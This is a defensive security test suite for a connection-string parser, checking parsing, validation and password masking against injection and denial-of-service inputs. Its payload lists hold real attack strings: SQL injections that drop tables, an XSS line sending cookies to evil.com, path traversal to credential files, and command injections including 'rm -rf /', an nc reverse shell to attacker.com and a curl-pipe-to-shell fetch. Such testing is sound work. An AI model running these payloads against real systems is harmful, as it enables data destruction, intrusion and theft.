/**
 * Security Tests - Injection Prevention
 *
 * Tests the application's resistance to various injection attacks.
 * These tests verify that malicious input is properly sanitized,
 * escaped, or rejected.
 *
 * Categories:
 * - SQL Injection
 * - XSS (Cross-Site Scripting)
 * - Path Traversal
 * - Command Injection
 * - Template Injection
 */

import * as fc from 'fast-check';
import {
  parseConnectionString,
  validateConnectionString,
  maskPassword,
  buildConnectionString,
} from '../../src/utils/connection-validator';
import {
  sqlInjectionPayload,
  xssPayload,
  pathTraversalPayload,
  commandInjectionPayload,
} from '../utils/test-generators';

// ============================================================================
// SQL INJECTION TESTS
// ============================================================================

describe('Security: SQL Injection Prevention', () => {
  /**
   * Comprehensive SQL injection payloads
   */
  const sqlPayloads = [
    // Classic injections
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "1' OR '1'='1' --",
    "admin'--",
    "'; TRUNCATE TABLE users; --",
    '1; DELETE FROM users WHERE 1=1',

    // Union-based injections
    "' UNION SELECT * FROM users --",
    "' UNION SELECT NULL, username, password FROM users --",
    '1 UNION ALL SELECT 1,2,3,4,5--',

    // Time-based blind injection
    "'; WAITFOR DELAY '0:0:10'--",
    "1' AND SLEEP(5)--",
    "1' AND BENCHMARK(10000000,SHA1('test'))--",

    // Error-based injection
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",

    // Stacked queries
    "'; INSERT INTO users VALUES('hacker','password'); --",
    "'; UPDATE users SET password='hacked'; --",

    // NoSQL injection (if applicable)
    '{"$gt": ""}',
    '{"$ne": null}',

    // Comment variations
    "admin'/*",
    "admin'#",
    "admin'\\",
  ];

  describe('connection string parsing', () => {
    it('should not execute SQL in database names', () => {
      for (const payload of sqlPayloads) {
        const encodedPayload = encodeURIComponent(payload);
        const conn = `postgresql://user:pass@localhost/${encodedPayload}`;

        // Should not crash
        expect(() => {
          try {
            const result = parseConnectionString(conn);
            // If it parses, the database name should be the payload (not executed)
            expect(result.database).toBe(payload);
          } catch {
            // Throwing is also acceptable
          }
        }).not.toThrow(/memory|segfault|heap/i);
      }
    });

    it('should not execute SQL in usernames', () => {
      for (const payload of sqlPayloads) {
        const conn = `postgresql://${encodeURIComponent(payload)}:pass@localhost/db`;

        expect(() => {
          try {
            parseConnectionString(conn);
          } catch {
            // Throwing is fine
          }
        }).not.toThrow(/memory|segfault|heap/i);
      }
    });

    it('should not execute SQL in passwords', () => {
      for (const payload of sqlPayloads) {
        const conn = `postgresql://user:${encodeURIComponent(payload)}@localhost/db`;

        expect(() => {
          try {
            parseConnectionString(conn);
          } catch {
            // Throwing is fine
          }
        }).not.toThrow(/memory|segfault|heap/i);
      }
    });

    it('should not execute SQL in host names', () => {
      for (const payload of sqlPayloads.slice(0, 10)) {
        const conn = `postgresql://user:pass@${encodeURIComponent(payload)}/db`;

        expect(() => {
          try {
            parseConnectionString(conn);
          } catch {
            // Throwing is expected for invalid hosts
          }
        }).not.toThrow(/memory|segfault|heap/i);
      }
    });
  });

  describe('property-based SQL injection tests', () => {
    it('should safely handle any SQL injection payload', () => {
      fc.assert(
        fc.property(sqlInjectionPayload, (payload) => {
          const conn = `postgresql://user:pass@localhost/${encodeURIComponent(payload)}`;

          // Should not crash or hang
          const start = Date.now();
          try {
            const result = validateConnectionString(conn);
            // Validation should complete
            expect(result).toBeDefined();
          } catch {
            // Throwing is acceptable
          }
          const elapsed = Date.now() - start;

          // Should not take more than 1 second (no time-based injection working)
          expect(elapsed).toBeLessThan(1000);
        })
      );
    });
  });
});

// ============================================================================
// XSS PREVENTION TESTS
// ============================================================================

describe('Security: XSS Prevention', () => {
  const xssPayloads = [
    '<script>alert("xss")</script>',
    '"><script>alert("xss")</script>',
    "javascript:alert('xss')",
    '<img src=x onerror=alert("xss")>',
    '<svg onload=alert("xss")>',
    '<body onload=alert("xss")>',
    '<iframe src="javascript:alert(1)">',
    '<input onfocus=alert(1) autofocus>',
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
    '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
    '<img src="x" onerror="eval(atob(\'YWxlcnQoJ3hzcycp\'))">',
  ];

  describe('password masking', () => {
    it('should mask XSS payloads in passwords', () => {
      for (const payload of xssPayloads) {
        const conn = `postgresql://user:${encodeURIComponent(payload)}@localhost/db`;
        const masked = maskPassword(conn);

        // The masked output should not contain the raw payload
        expect(masked).not.toContain(payload);
        // Should contain the mask
        expect(masked).toContain('***');
      }
    });

    it('should not expose XSS in error messages', () => {
      for (const payload of xssPayloads) {
        const conn = `postgresql://user:${encodeURIComponent(payload)}@/`;

        try {
          validateConnectionString(conn);
        } catch (error) {
          const errorMessage = (error as Error).message;
          // Error message should not contain raw script tags
          expect(errorMessage).not.toContain('<script>');
          expect(errorMessage).not.toContain('javascript:');
        }
      }
    });
  });

  describe('property-based XSS tests', () => {
    it('should safely handle any XSS payload', () => {
      fc.assert(
        fc.property(xssPayload, (payload) => {
          const conn = `postgresql://user:${encodeURIComponent(payload)}@localhost/db`;

          // Should mask without exposing payload
          const masked = maskPassword(conn);
          expect(masked).toContain('***');

          // The password is correctly stored (not executed)
          // XSS prevention happens at the display layer, not parsing
          const result = validateConnectionString(conn);
          expect(result.parsed?.password).toBe(payload);
        })
      );
    });
  });
});

// ============================================================================
// PATH TRAVERSAL PREVENTION TESTS
// ============================================================================

describe('Security: Path Traversal Prevention', () => {
  const pathPayloads = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '/etc/passwd',
    '/var/www/../../etc/passwd',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc/passwd',
    '/proc/self/environ',
    'C:\\Windows\\System32\\config\\SAM',
    '..\\..\\..\\..\\..\\..\\windows\\win.ini',
  ];

  describe('SQLite path handling', () => {
    it('should parse path traversal attempts without execution', () => {
      for (const payload of pathPayloads) {
        const conn = `sqlite:///${payload}`;

        // Should parse without actually accessing the file system
        const result = parseConnectionString(conn);

        // The path is stored but not accessed during parsing
        expect(result.type).toBe('sqlite');
        // Path is preserved as-is - actual path validation happens at runtime
        expect(result.database).toBeDefined();
      }
    });

    it('should handle encoded path traversal', () => {
      for (const payload of pathPayloads.slice(0, 5)) {
        const encoded = encodeURIComponent(payload);
        const conn = `sqlite:///${encoded}`;

        expect(() => {
          parseConnectionString(conn);
        }).not.toThrow();
      }
    });
  });

  describe('property-based path traversal tests', () => {
    it('should safely handle any path traversal payload', () => {
      fc.assert(
        fc.property(pathTraversalPayload, (payload) => {
          const conn = `sqlite:///${payload}`;

          // Should parse without file system access
          expect(() => {
            const result = parseConnectionString(conn);
            expect(result.type).toBe('sqlite');
          }).not.toThrow();
        })
      );
    });
  });
});

// ============================================================================
// COMMAND INJECTION PREVENTION TESTS
// ============================================================================

describe('Security: Command Injection Prevention', () => {
  const commandPayloads = [
    '; ls -la',
    '| cat /etc/passwd',
    '`whoami`',
    '$(whoami)',
    '& dir',
    '\n/bin/cat /etc/passwd',
    '|| ls',
    '&& echo pwned',
    '; rm -rf /',
    '| nc attacker.com 4444 -e /bin/sh',
    '$(curl http://evil.com/shell.sh | sh)',
  ];

  describe('connection string parameters', () => {
    it('should not execute commands in database names', () => {
      for (const payload of commandPayloads) {
        const conn = `postgresql://user:pass@localhost/${encodeURIComponent(payload)}`;

        // Should not execute the command
        expect(() => {
          try {
            const result = parseConnectionString(conn);
            // If it parses, the database should just be the text
            expect(result.database).toBeDefined();
          } catch {
            // Throwing is acceptable
          }
        }).not.toThrow();
      }
    });

    it('should not execute commands in query parameters', () => {
      for (const payload of commandPayloads) {
        const conn = `postgresql://user:pass@localhost/db?cmd=${encodeURIComponent(payload)}`;

        expect(() => {
          const result = parseConnectionString(conn);
          // The parameter should be stored but not executed
          expect(result.options.cmd).toBeDefined();
        }).not.toThrow();
      }
    });
  });

  describe('property-based command injection tests', () => {
    it('should safely handle any command injection payload', () => {
      fc.assert(
        fc.property(commandInjectionPayload, (payload) => {
          const conn = `postgresql://user:pass@localhost/${encodeURIComponent(payload)}`;

          // Should not execute commands or crash
          const start = Date.now();
          try {
            parseConnectionString(conn);
          } catch {
            // Throwing is fine
          }
          const elapsed = Date.now() - start;

          // Should complete quickly (not executing external commands)
          expect(elapsed).toBeLessThan(100);
        })
      );
    });
  });
});

// ============================================================================
// DENIAL OF SERVICE PREVENTION TESTS
// ============================================================================

describe('Security: DoS Prevention', () => {
  describe('regex ReDoS', () => {
    it('should handle pathological regex inputs quickly', () => {
      // ReDoS payloads that cause catastrophic backtracking
      const redosPayloads = [
        'a'.repeat(50) + '!',
        'x'.repeat(100) + 'y',
        ('ab' + 'ab'.repeat(20) + 'c').repeat(5),
      ];

      for (const payload of redosPayloads) {
        const conn = `postgresql://user:pass@localhost/${encodeURIComponent(payload)}`;

        const start = Date.now();
        try {
          parseConnectionString(conn);
        } catch {
          // Throwing is fine
        }
        const elapsed = Date.now() - start;

        // Should complete in under 100ms (no ReDoS)
        expect(elapsed).toBeLessThan(100);
      }
    });
  });

  describe('resource exhaustion', () => {
    it('should handle extremely long connection strings', () => {
      const longPayload = 'a'.repeat(1000000); // 1MB
      const conn = `postgresql://user:pass@localhost/${longPayload}`;

      const start = Date.now();
      try {
        parseConnectionString(conn);
      } catch {
        // May throw for invalid URL
      }
      const elapsed = Date.now() - start;

      // Should complete in under 5 seconds
      expect(elapsed).toBeLessThan(5000);
    });

    it('should handle many query parameters', () => {
      const params = Array.from(
        { length: 10000 },
        (_, i) => `p${i}=v${i}`
      ).join('&');
      const conn = `postgresql://user:pass@localhost/db?${params}`;

      const start = Date.now();
      const result = parseConnectionString(conn);
      const elapsed = Date.now() - start;

      expect(elapsed).toBeLessThan(1000);
      expect(Object.keys(result.options).length).toBe(10000);
    });
  });
});

// ============================================================================
// SENSITIVE DATA EXPOSURE TESTS
// ============================================================================

describe('Security: Sensitive Data Exposure', () => {
  describe('password handling', () => {
    it('should never log raw passwords', () => {
      const sensitivePasswords = [
        'MyS3cr3tP@ssw0rd!',
        'production_db_password_2024',
        'api_key_live_sk_test_12345',
      ];

      for (const password of sensitivePasswords) {
        // Use URL encoding for special characters
        const encoded = encodeURIComponent(password);
        const conn = `postgresql://admin:${encoded}@localhost/db`;

        // Parse and mask
        const result = parseConnectionString(conn);
        const masked = maskPassword(conn);

        // The password should be in parsed result (decoded)
        expect(result.password).toBe(password);

        // The masked version should have :***@ instead of :password@
        expect(masked).toContain(':***@');
        // And should NOT contain the password pattern
        expect(masked).not.toContain(`:${encoded}@`);
      }
    });

    it('should not expose passwords in validation errors', () => {
      const password = 'super_secret_password_123';
      const conn = `postgresql://user:${password}@/`; // Invalid - no host

      const result = validateConnectionString(conn);

      // Errors should not contain the password
      for (const error of result.errors) {
        expect(error).not.toContain(password);
      }
      for (const suggestion of result.suggestions) {
        expect(suggestion).not.toContain(password);
      }
    });

    it('should handle special characters in passwords securely', () => {
      const specialPasswords = [
        'p@ss:word/with#special?chars',
        'quote\'s"double',
        'backslash\\path',
        'newline\npassword',
        'tab\tpassword',
        'null\x00byte',
      ];

      for (const password of specialPasswords) {
        const encoded = encodeURIComponent(password);
        const conn = `postgresql://user:${encoded}@localhost/db`;

        // Should parse without exposing in logs
        const result = parseConnectionString(conn);
        const masked = maskPassword(conn);

        expect(result.password).toBe(password);
        expect(masked).not.toContain(password);
      }
    });
  });
});
